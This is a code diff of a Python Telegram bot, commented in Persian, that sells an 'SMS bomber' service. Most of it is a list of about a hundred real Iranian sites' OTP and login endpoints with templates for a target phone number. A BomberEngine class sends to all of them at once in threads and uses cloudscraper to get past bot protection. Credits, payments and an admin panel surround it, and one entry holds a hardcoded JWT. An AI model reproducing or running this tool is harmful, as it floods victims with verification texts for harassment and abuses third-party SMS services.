+    {"name": "Novinparse", "url": "https://novinparse.com/Page/PageAction.aspx", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"Action": "SendVerifyCode", "repeatFlag": "true", "mobile": "0{phone}"}, "type": "json"},
+    {"name": "Sunnybook", "url": "https://sunnybook.ir/Home/RegisterUser", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"name": "Mr", "password": "123456", "mobile": "{phone}"}, "type": "json"},
+    {"name": "Adinehbook", "url": "https://www.adinehbook.com/gp/flex/sign-in.html", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"action": "sign", "phone_cell_or_email": "0{phone}"}, "type": "json"},
+    {"name": "Parkbag", "url": "https://parkbag.com/fa/Account/RegisterOrLoginByMobileNumber", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"ReturnUrl": "https://parkbag.com/", "MobaileNumber": "{phone}"}, "type": "json"},
+    {"name": "Mahouney", "url": "https://mahouney.com/fa/Account/RegisterOrLoginByMobileNumber", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"ReturnUrl": "https://mahouney.com/", "MobaileNumber": "0{phone}"}, "type": "json"},
+    {"name": "Shimashoes", "url": "https://shimashoes.com/api/customer/member/register/", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"email": "0{phone}"}, "type": "json"},
+    {"name": "Queenaccessories", "url": "https://queenaccessories.ir/api/v1/sessions/login_request", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"mobile_phone": "0{phone}"}, "type": "json"},
+    {"name": "Vinaaccessory", "url": "https://vinaaccessory.com/api/v1/sessions/login_request", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"mobile_phone": "0{phone}"}, "type": "json"},
+    {"name": "Rastaraccessory", "url": "https://rastaraccessory.ir/api/v1/sessions/login_request", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"mobile_phone": "0{phone}"}, "type": "json"},
+    {"name": "Bartarinha", "url": "https://bartarinha.com/Advertisement/Users/RequestLoginMobile", "method": "POST", "headers": {"Content-Type": "application/json", "X-Requested-With": "XMLHttpRequest"}, "payload": {"mobileNo": "0{phone}"}, "type": "json"},
+    {"name": "Manoshahr", "url": "https://manoshahr.ir/jq.php", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"mobile": "0{phone}", "class_name": "public_login", "function_name": "sendCode"}, "type": "json"},
+    {"name": "80w", "url": "https://80w.ir/wp-admin/admin-ajax.php", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"login": "0{phone}", "action": "logini_first"}, "type": "json"},
+    {"name": "Hovalvakil", "url": "https://api.hovalvakil.com/api/User/SendConfirmCode", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"userName": "{phone}"}, "type": "json"},
+    {"name": "Digighate", "url": "https://api.digighate.com/v2/public/code", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"phone": "{phone}"}, "type": "json"},
+    {"name": "Azarbadbook", "url": "https://azarbadbook.ir/ajax/login_j_ajax_ver/", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"phone": "{phone}"}, "type": "json"},
+    {"name": "Kanoonbook", "url": "https://www.kanoonbook.ir/store/customer_otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"customer_username": "{phone}", "task": "customer_phone"}, "type": "json"},
+    {"name": "Ketabir", "url": "https://sso-service.ketab.ir/api/v2/signup/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"Mobile": "0{phone}", "OtpSmsType": "1"}, "type": "json"},
+    {"name": "Snappshop", "url": "https://apix.snappshop.co/auth/v1/pre-login", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"mobile": "0{phone}"}, "type": "json"},
+    {"name": "Ketabium", "url": "https://www.ketabium.com/login-register", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"username": "0{phone}"}, "type": "json"},
+    {"name": "Rirabook", "url": "https://rirabook.com/loginAth", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"mobile1": "0{phone}", "loginbt1": ""}, "type": "json"},
+    {"name": "Pashikshoes", "url": "https://api.pashikshoes.com/v1/customer/register-login", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"mobile": "0{phone}"}, "type": "json"},
+    {"name": "Tamimpishro", "url": "https://www.tamimpishro.com/site/api/v1/user/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"mobile": "0{phone}"}, "type": "json"},
+    {"name": "Fafait", "url": "https://api2.fafait.net/oauth/check-user", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"id": "0{phone}"}, "type": "json"},
+    {"name": "Fankala", "url": "https://fankala.com/wp-admin/admin-ajax.php", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"action": "verify_user_login", "user": "0{phone}", "captcha": ""}, "type": "json"},
+    {"name": "Arastag", "url": "https://arastag.ir/wp-admin/admin-ajax.php", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"action": "verify_user_login", "user": "0{phone}", "captcha": ""}, "type": "json"},
+    {"name": "Mellishoes", "url": "https://mellishoes.ir/wp-admin/admin-ajax.php", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"action": "websima_auth_account_detection", "mobile": "0{phone}"}, "type": "json"},
+    {"name": "Setshoe", "url": "https://setshoe.ir/wp-admin/admin-ajax.php", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"action": "stm_login_register", "type": "mobile", "input": "0{phone}"}, "type": "json"},
+    {"name": "Telketab", "url": "https://telketab.com/opt_field/check_secret", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"identity": "0{phone}", "plugin": "otp_field_sms_processor"}, "type": "json"},
+    {"name": "Gitamehr", "url": "https://gitamehr.ir/wp-admin/admin-ajax.php", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"action": "stm_login_register", "type": "mobile", "input": "0{phone}"}, "type": "json"},
+    {"name": "Meidane", "url": "https://meidane.com/accounts/login", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"name": "Mr", "password": "123456", "mobile": "{phone}"}, "type": "json"},
+    {"name": "Myroz", "url": "https://myroz.ir/wp-admin/admin-ajax.php", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"action": "stm_login_register", "type": "mobile", "input": "0{phone}"}, "type": "json"},
+    {"name": "Elecmarket", "url": "https://elecmarket.ir/wp-admin/admin-ajax.php", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"action": "stm_login_register", "type": "mobile", "input": "0{phone}"}, "type": "json"},
+    {"name": "Techsiro", "url": "https://techsiro.com/send-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"client": "web", "method": "POST", "mobile": "0{phone}"}, "type": "json"},
+    {"name": "Account724", "url": "https://account724.com/wp-admin/admin-ajax.php", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"action": "stm_login_register", "type": "mobile", "input": "0{phone}"}, "type": "json"},
+    {"name": "Eaccount", "url": "https://eaccount.ir/api/v1/sessions/login_request", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"mobile_phone": "0{phone}"}, "type": "json"},
+    {"name": "Chortkehshop", "url": "https://chortkehshop.ir/api/v1/sessions/login_request", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"mobile_phone": "0{phone}"}, "type": "json"},
+    {"name": "Piinkstore", "url": "https://piinkstore.ir/api/v1/sessions/login_request", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"mobile_phone": "0{phone}"}, "type": "json"},
+    {"name": "Dreamlandshop", "url": "https://dreamlandshop.ir/api/v1/sessions/login_request", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"mobile_phone": "0{phone}"}, "type": "json"},
+    {"name": "Novinmedical", "url": "https://novinmedical.com/wp-admin/admin-ajax.php", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"action": "stm_login_register", "type": "mobile", "input": "0{phone}"}, "type": "json"},
+    {"name": "Taaghche", "url": "https://gw.taaghche.com/v4/site/auth/login", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"contact": "0{phone}", "forceOtp": False}, "type": "json"},
+    {"name": "Fidibo", "url": "https://fidibo.com/user/login-by-sms", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "payload": {"mobile_number": "{phone}", "country_code": "ir"}, "type": "form"},
+    {"name": "Ketabchi", "url": "https://ketabchi.com/api/v1/auth/requestVerificationCode", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"phoneNumber": "0{phone}"}, "type": "json"},
+    {"name": "Virgool", "url": "https://virgool.io/api/v1.4/auth/verify", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"method": "phone", "identifier": "0{phone}"}, "type": "json"},
+    {"name": "Timcheh", "url": "https://api.timcheh.com/auth/otp/send", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"mobile": "0{phone}"}, "type": "json"},
+    {"name": "Football360", "url": "https://football360.ir/api/auth/verify-phone/", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"phone_number": "+98{phone}"}, "type": "json"},
+    {"name": "Pinorest", "url": "https://api.pinorest.com/frontend/auth/login/mobile", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"mobile": "{phone}"}, "type": "json"},
+    {"name": "Ghasedak24", "url": "https://ghasedak24.com/user/ajax_register", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"username": "0{phone}"}, "type": "json"},
+    {"name": "Iranketab", "url": "https://www.iranketab.ir/account/register", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"UserName": "0{phone}"}, "type": "json"},
+    {"name": "Takfarsh", "url": "https://takfarsh.com/wp-content/themes/bakala/template-parts/send.php", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"phone_email": "0{phone}"}, "type": "json"},
+    {"name": "Dadpardaz", "url": "https://dadpardaz.com/advice/getLoginConfirmationCode", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"mobile": "0{phone}"}, "type": "json"},
+    {"name": "Iranicard", "url": "https://api.iranicard.ir/api/v1/register", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"mobile": "0{phone}"}, "type": "json"},
+    {"name": "Tj8", "url": "https://tj8.ir/auth/register", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"mobile": "0{phone}"}, "type": "json"},
+    {"name": "Mashinbank", "url": "https://mashinbank.com/api2/users/check", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"mobileNumber": "0{phone}"}, "type": "json"},
+    {"name": "Cinematicket", "url": "https://cinematicket.org/api/v1/users/signup", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"phone_number": "0{phone}"}, "type": "json"},
+    {"name": "Kafegheymat", "url": "https://kafegheymat.com/shop/getLoginSms", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"phone": "0{phone}"}, "type": "json"},
+    {"name": "Opco", "url": "https://shop.opco.co.ir/index.php?route=extension/module/login_verify/update_register_code", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"telephone": "0{phone}"}, "type": "json"},
+    {"name": "Melix", "url": "https://melix.shop/site/api/v1/user/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"mobile": "0{phone}"}, "type": "json"},
+    {"name": "Safiran", "url": "https://safiran.shop/login", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"mobile": "0{phone}"}, "type": "json"},
+    {"name": "Pirankalaco", "url": "https://pirankalaco.ir/shop/SendPhone.php", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded", "X-Requested-With": "XMLHttpRequest"}, "payload": {"phone": "0{phone}"}, "type": "form"},
+    {"name": "Dastakht", "url": "https://dastkhat-isad.ir/api/v1/user/store", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"mobile": "{phone}", "countryCode": 98, "device_os": 2}, "type": "json"},
+    {"name": "Hamlex", "url": "https://hamlex.ir/register.php", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "payload": {"fullname": "ممد", "phoneNumber": "0{phone}", "register": ""}, "type": "form"},
+    {"name": "Irwco", "url": "https://irwco.ir/register", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded", "X-Requested-With": "XMLHttpRequest"}, "payload": {"mobile": "0{phone}"}, "type": "form"},
+    {"name": "Sibbank", "url": "https://api.sibbank.ir/v1/auth/login", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"phone_number": "0{phone}"}, "type": "json"},
+    {"name": "Arshian", "url": "https://api.arshiyan.com/send_code", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"country_code": "98", "phone_number": "{phone}"}, "type": "json"},
+    {"name": "Topnoor", "url": "https://backend.topnoor.ir/web/v1/user/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"mobile": "0{phone}"}, "type": "json"},
+    {"name": "Alinance", "url": "https://api.alinance.com/user/register/mobile/send/", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"phone_number": "0{phone}"}, "type": "json"},
+    {"name": "Chaymarket", "url": "https://www.chaymarket.com/wp-admin/admin-ajax.php", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded", "X-Requested-With": "XMLHttpRequest"}, "payload": {"action": "digits_check_mob", "countrycode": "+98", "mobileNo": "0{phone}", "login": "2", "json": "1", "whatsapp": "0"}, "type": "form"},
+    {"name": "Coffefastfoodluxury", "url": "https://coffefastfoodluxury.ir/wp-admin/admin-ajax.php", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded", "X-Requested-With": "XMLHttpRequest"}, "payload": {"action": "digits_check_mob", "countrycode": "+98", "mobileNo": "0{phone}", "login": "2", "json": "1", "whatsapp": "0"}, "type": "form"},
+    {"name": "Dosma", "url": "https://app.dosma.ir/sendverify/", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"username": "0{phone}"}, "type": "json"},
+    {"name": "Ehteraman", "url": "https://api.ehteraman.com/api/request/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"mobile": "0{phone}"}, "type": "json"},
+    {"name": "Mcishop", "url": "https://api-ebcom.mci.ir/services/auth/v1.0/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"msisdn": "{phone}"}, "type": "json"},
+    {"name": "Abantether", "url": "https://abantether.com/users/register/phone/send/", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"phoneNumber": "0{phone}"}, "type": "json"},
+    {"name": "Flightio", "url": "https://flightio.com/bff/Authentication/CheckUserKey", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"userKey": "0{phone}"}, "type": "json"},
+    {"name": "Chamedon", "url": "https://chamedoon.com/api/v1/membership/guest/request_mobile_verification", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"mobile": "0{phone}"}, "type": "json"},
+    {"name": "Shab", "url": "https://www.shab.ir/api/fa/sandbox/v_1_4/auth/enter-mobile", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"mobile": "0{phone}"}, "type": "json"},
+    {"name": "Farvi", "url": "https://farvi.shop/api/v1/sessions/login_request", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"mobile_phone": "0{phone}"}, "type": "json"},
+    {"name": "A4baz", "url": "https://a4baz.com/api/web/login", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"cellphone": "0{phone}"}, "type": "json"},
+    {"name": "Hyperjan", "url": "https://shop.hyperjan.ir/api/users/manage", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"mobile": "0{phone}"}, "type": "json"},
+    {"name": "Banankala", "url": "https://banankala.com/home/login", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"Mobile": "0{phone}"}, "type": "json"},
+    {"name": "Rokla", "url": "https://api.rokla.ir/api/request/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"mobile": "0{phone}"}, "type": "json"},
+    {"name": "Safarmarket", "url": "https://safarmarket.com//api/security/v2/user/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"phone": "0{phone}"}, "type": "json"},
+    {"name": "Emtiaz", "url": "https://web.emtiyaz.app/json/login", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "payload": {"send": "1", "cellphone": "0{phone}"}, "type": "form"},
+    {"name": "Azinja", "url": "https://arzinja.app/api/login", "method": "POST", "headers": {"Content-Type": "multipart/form-data"}, "payload": {"mobile": "0{phone}"}, "type": "form"},
+    {"name": "Digify", "url": "https://apollo.digify.shop/graphql", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"operationName": "Mutation", "variables": {"content": {"phone_number": "0{phone}"}}, "query": "mutation Mutation($content: MerchantRegisterOTPSendContent) { merchantRegister { otpSend(content: $content) __typename } }"}, "type": "json"},
+    {"name": "Chartex", "url": "https://api.chartex.net/api/v2/user/validate", "method": "POST", "headers": {"Content-Type": "application/json", "provider-code": "RUBIKA", "Authorization": "JWT eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE1OTgwMzU0NDEsImlhdCI6MTU5Nzg2MjY0MSwibmJmIjoxNTk3ODYyNjQxLCJhZCI6MTA2NDIxLCJpZCI6MTA2NDIyLCJyb2xlIjoiR1VFU1QiLCJzZXNzaW9uX2tleSI6ImxvZ2luX3Nlc3Npb25fMTA2NDIxXzEwNjQyMl9JQXdqUkZrTVBMUWhJeG5oSGFlQXdqVHciLCJwYyI6bnVsbCwiYyI6IklSUiJ9.wMAa_fI7VVBal8IhBeM-6wmGK4bDUOEj2fjoKhknyRk"}, "payload": {"mobile": "0{phone}", "country_code": "IR", "provider_code": "RUBIKA"}, "type": "json"},
+    {"name": "Wisgoon", "url": "https://gateway.wisgoon.com/api/v1/auth/login/", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"phone": "0{phone}", "recaptcha-response": "", "token": "e622c330c77a17c8426e638d7a85da6c2ec9f455"}, "type": "json"},
+    {"name": "Behzadshami", "url": "https://behzadshami.com/wp-admin/admin-ajax.php", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded", "X-Requested-With": "XMLHttpRequest"}, "payload": {"action": "digits_check_mob", "countrycode": "+98", "mobileNo": "{phone}", "login": "2", "json": "1", "whatsapp": "0"}, "type": "form"},
+    {"name": "Pubgsell", "url": "https://pubg-sell.ir/loginuser", "method": "GET", "headers": {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"}, "payload": {"username": "0{phone}"}, "type": "json"},
+    {"name": "Pindo", "url": "https://api.pindo.ir/v1/user/login-register/", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"phone": "0{phone}"}, "type": "json"},
+    {"name": "Pateh", "url": "https://api.pateh.com/api/v1/LoginOrRegister", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"mobile": "0{phone}"}, "type": "json"},
+    {"name": "Reyanertebat", "url": "https://pay.rayanertebat.ir/api/User/Otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"mobileNo": "0{phone}"}, "type": "json"},
+    {"name": "Iranlms", "url": "https://messengerg2c4.iranlms.ir/", "method": "POST", "headers": {"Content-Type": "text/plain"}, "payload": {"se": "0{phone}"}, "type": "json"},
+    {"name": "Ostadkar", "url": "https://api.ostadkr.com/login", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"mobile": "0{phone}"}, "type": "json"},
+    {"name": "Sibirani", "url": "https://sandbox.sibirani.ir/api/v1/user/invite", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"username": "0{phone}"}, "type": "json"},
+    {"name": "Miare", "url": "https://www.miare.ir/api/otp/driver/request/", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"phone_number": "0{phone}"}, "type": "json"}
+]
 
 # ============================================================
-# Bomber Engine
+# موتور ارسال
 # ============================================================
 
 class BomberEngine:
     def __init__(self):
-        self.scraper = cloudscraper.create_scraper(
-            browser={'browser': 'chrome', 'platform': 'windows', 'mobile': False}
-        )
+        self.scraper = cloudscraper.create_scraper(browser={'browser': 'chrome'})
         self.is_running = False
         self.results = []
-        self.target_phone = ""
-        self.max_workers = 50
     
-    def _replace_phone(self, obj, phone: str):
+    def _replace_phone(self, obj, phone):
         if isinstance(obj, str):
             return obj.replace("{phone}", phone)
         elif isinstance(obj, dict):
@@ -707,57 +433,32 @@ class BomberEngine:
             return [self._replace_phone(i, phone) for i in obj]
         return obj
     
-    def attack_site(self, site: Dict, phone: str, test_type: str = "without_zero") -> Dict:
+    def attack_site(self, site, phone, test_type):
         result = {
             'name': site.get('name', 'Unknown'),
-            'url': site.get('url', ''),
-            'phone': phone,
-            'test_type': test_type,
             'status': 'unknown',
             'status_code': None,
-            'error': None,
             'message': None,
-            'timestamp': datetime.now().isoformat()
+            'error': None
         }
         
         try:
             headers = site.get('headers', {}).copy()
-            
-            if test_type == "with_zero":
-                test_phone = "0" + phone
-            else:
-                test_phone = phone if not phone.startswith('0') else phone[1:]
-            
+            test_phone = "0" + phone if test_type == "with_zero" else phone
             payload = self._replace_phone(site.get('payload', {}), test_phone)
             url = site['url'].replace("{phone}", test_phone)
             
             if site.get('method') == 'GET':
-                response = self.scraper.get(url, params=payload, headers=headers, timeout=15)
+                response = self.scraper.get(url, params=payload, headers=headers, timeout=10)
             else:
                 if site.get('type') == 'form':
-                    response = self.scraper.post(url, data=payload, headers=headers, timeout=15)
+                    response = self.scraper.post(url, data=payload, headers=headers, timeout=10)
                 else:
-                    response = self.scraper.post(url, json=payload, headers=headers, timeout=15)
+                    response = self.scraper.post(url, json=payload, headers=headers, timeout=10)
             
             result['status_code'] = response.status_code
             result['status'] = 'success' if response.status_code < 400 else 'failed'
-            
-            try:
-                resp_json = response.json()
-                if resp_json.get('success') or resp_json.get('status') == 'success' or resp_json.get('result') == 'OK':
-                    result['message'] = '✅ OTP sent!'
-                elif resp_json.get('message'):
-                    result['message'] = f"📩 {resp_json.get('message')}"
-                else:
-                    result['message'] = f'Response: {response.text[:80]}'
-            except:
-                text = response.text.lower()
-                if 'success' in text or 'ok' in text or 'otp' in text:
-                    result['message'] = '✅ Request sent!'
-                elif 'already' in text or 'exist' in text:
-                    result['message'] = '⚠️ Already registered'
-                else:
-                    result['message'] = f'Response: {response.text[:80]}'
+            result['message'] = f"Response: {response.text[:50]}"
             
         except Exception as e:
             result['status'] = 'error'
@@ -765,165 +466,55 @@ class BomberEngine:
         
         return result
     
-    def run_bomb(self, endpoints: List[Dict], phone: str, callback: Callable = None, 
-                 mode: str = "storm", on_complete: Callable = None) -> Dict:
+    def run_bomb(self, endpoints, phone, mode="storm", on_complete=None):
         self.is_running = True
         self.results = []
-        self.target_phone = phone
         
-        variations = ["without_zero", "with_zero"]
-        variation_names = ["بدون صفر", "با صفر"]
+        types = ["without_zero", "with_zero"]
         
-        total_endpoints = len(endpoints) * len(variations)
-        processed = 0
-        
-        try:
-            for var_idx, var_type in enumerate(variations):
-                if not self.is_running:
-                    break
-                
-                if callback:
-                    callback("progress", f"📱 تست: {variation_names[var_idx]}")
-                
-                if mode == "storm":
-                    with ThreadPoolExecutor(max_workers=self.max_workers) as executor:
-                        future_to_site = {
-                            executor.submit(self.attack_site, site, phone, var_type): site
-                            for site in endpoints
-                        }
-                        
-                        for future in as_completed(future_to_site):
-                            if not self.is_running:
-                                break
-                            result = future.result()
-                            self.results.append(result)
-                            processed += 1
-                            if callback:
-                                callback("result", result)
-                                callback("progress", f"پیشرفت: {processed}/{total_endpoints}")
-                else:
-                    for site in endpoints:
+        for t in types:
+            if not self.is_running:
+                break
+            
+            if mode == "storm":
+                with ThreadPoolExecutor(max_workers=20) as executor:
+                    futures = [executor.submit(self.attack_site, site, phone, t) for site in endpoints]
+                    for future in as_completed(futures):
                         if not self.is_running:
                             break
-                        result = self.attack_site(site, phone, var_type)
-                        self.results.append(result)
-                        processed += 1
-                        if callback:
-                            callback("result", result)
-                            callback("progress", f"پیشرفت: {processed}/{total_endpoints}")
-                        time.sleep(0.5)
-                
-                if callback:
-                    callback("round_complete", f"✅ {variation_names[var_idx]} کامل شد")
+                        self.results.append(future.result())
+            else:
+                for site in endpoints:
+                    if not self.is_running:
+                        break
+                    self.results.append(self.attack_site(site, phone, t))
+                    time.sleep(0.2)
         
-        except Exception as e:
-            if callback:
-                callback("error", f"❌ خطا در حین اجرا: {e}")
+        self.is_running = False
+        success = [r for r in self.results if r['status'] == 'success']
         
-        finally:
-            self.is_running = False
-            
-            success = [r for r in self.results if r['status'] == 'success']
-            failed = [r for r in self.results if r['status'] == 'failed']
-            errors = [r for r in self.results if r['status'] == 'error']
-            
-            result = {
-                'total': len(self.results),
-                'success': len(success),
-                'failed': len(failed),
-                'errors': len(errors),
-                'results': self.results,
-                'target_phone': phone
-            }
-            
-            if on_complete:
-                on_complete(result)
-            
-            return result
+        result = {
+            'total': len(self.results),
+            'success': len(success),
+            'failed': len([r for r in self.results if r['status'] == 'failed']),
+            'errors': len([r for r in self.results if r['status'] == 'error']),
+            'results': self.results
+        }
+        
+        if on_complete:
+            on_complete(result)
+        return result
     
     def stop(self):
         self.is_running = False
 
-bomber_engine = BomberEngine()
+bomber = BomberEngine()
 
 # ============================================================
-# Admin Panel
+# کیبوردها
 # ============================================================
 
-class AdminPanel:
-    @staticmethod
-    async def is_admin(user_id: int) -> bool:
-        return user_id in ADMIN_IDS or await db.is_admin(user_id)
-    
-    @staticmethod
-    async def show_admin_menu(user_id: int) -> InlineKeyboardMarkup:
-        keyboard = [
-            [InlineKeyboardButton(text="📋 درخواست‌های پرداخت", callback_data="admin_payments")],
-            [InlineKeyboardButton(text="👥 مدیریت کاربران", callback_data="admin_users")],
-            [InlineKeyboardButton(text="📊 آمار کلی", callback_data="admin_stats")],
-            [InlineKeyboardButton(text="📢 ارسال پیام همگانی", callback_data="admin_broadcast")],
-            [InlineKeyboardButton(text="📁 مدیریت اندپوینت‌ها", callback_data="admin_endpoints")],
-            [InlineKeyboardButton(text="🔙 بازگشت", callback_data="back_to_menu")]
-        ]
-        return InlineKeyboardMarkup(inline_keyboard=keyboard)
-    
-    @staticmethod
-    async def build_payment_keyboard(payment_id: int) -> InlineKeyboardMarkup:
-        keyboard = [
-            [InlineKeyboardButton(text="✅ تأیید", callback_data=f"approve_payment_{payment_id}"),
-             InlineKeyboardButton(text="❌ رد", callback_data=f"reject_payment_{payment_id}")],
-            [InlineKeyboardButton(text="🔙 بازگشت", callback_data="admin_payments")]
-        ]
-        return InlineKeyboardMarkup(inline_keyboard=keyboard)
-    
-    @staticmethod
-    async def build_user_keyboard(user_id: int) -> InlineKeyboardMarkup:
-        user = await db.get_user(user_id)
-        if not user:
-            return InlineKeyboardMarkup(inline_keyboard=[])
-        
-        is_banned = user.get('is_banned', 0) == 1
-        ban_text = "🚫 بن کردن" if not is_banned else "✅ رفع بن"
-        ban_callback = f"ban_user_{user_id}" if not is_banned else f"unban_user_{user_id}"
-        
-        keyboard = [
-            [InlineKeyboardButton(text="💰 تنظیم اعتبار", callback_data=f"set_credits_{user_id}")],
-            [InlineKeyboardButton(text=ban_text, callback_data=ban_callback)],
-            [InlineKeyboardButton(text="📊 مشاهده آمار", callback_data=f"user_stats_{user_id}")],
-            [InlineKeyboardButton(text="🔙 بازگشت", callback_data="admin_users")]
-        ]
-        return InlineKeyboardMarkup(inline_keyboard=keyboard)
-
-# ============================================================
-# Utils
-# ============================================================
-
-def is_valid_phone(phone: str) -> bool:
-    import re
-    phone = phone.replace(" ", "").replace("-", "").replace("_", "")
-    patterns = [
-        r"^09[0-9]{9}$",
-        r"^9[0-9]{9}$",
-        r"^\+989[0-9]{9}$",
-        r"^00989[0-9]{9}$",
-    ]
-    for pattern in patterns:
-        if re.match(pattern, phone):
-            return True
-    return False
-
-def format_time(seconds: int) -> str:
-    if seconds <= 0:
-        return "۰۰:۰۰"
-    minutes = int(seconds // 60)
-    secs = int(seconds % 60)
-    return f"{minutes:02d}:{secs:02d}"
-
-# ============================================================
-# کیبوردهای اصلی
-# ============================================================
-
-async def get_main_keyboard(user_id: int) -> InlineKeyboardMarkup:
+async def main_keyboard(user_id):
     keyboard = [
         [InlineKeyboardButton(text="📱 SMS Bomber", callback_data="sms_bomb")],
         [InlineKeyboardButton(text="👤 پروفایل", callback_data="profile")],
@@ -932,118 +523,104 @@ async def get_main_keyboard(user_id: int) -> InlineKeyboardMarkup:
         [InlineKeyboardButton(text="📊 آمار", callback_data="stats")]
     ]
     
-    if await AdminPanel.is_admin(user_id):
+    if user_id in ADMIN_IDS:
         keyboard.append([InlineKeyboardButton(text="⚙️ پنل مدیریت", callback_data="admin_panel")])
     
     return InlineKeyboardMarkup(inline_keyboard=keyboard)
 
 # ============================================================
-# دستورات اصلی
+# هندلرها (همون کدهای قبلی)
 # ============================================================
 
 @dp.message(CommandStart())
 async def cmd_start(message: Message):
     user_id = message.from_user.id
-    username = message.from_user.username
     first_name = message.from_user.first_name
-    last_name = message.from_user.last_name
-    
-    user = await db.get_user(user_id)
+    username = message.from_user.username
     
     args = message.text.split()
     referred_by = None
     if len(args) > 1 and args[1].startswith('ref_'):
-        referral_code = args[1][4:]
-        referrer = await db.get_user_by_referral_code(referral_code)
-        if referrer and referrer['user_id'] != user_id:
-            referred_by = referrer['user_id']
+        code = args[1][4:]
+        for uid, u in db.users.items():
+            if u.get('referral_code') == code and uid != user_id:
+                referred_by = uid
+                break
     
+    user = await db.get_user(user_id)
     if not user:
-        user = await db.create_user(user_id, username, first_name, last_name, referred_by)
-        await message.answer(
-            f"👋 **خوش آمدید {first_name}!**\n\n"
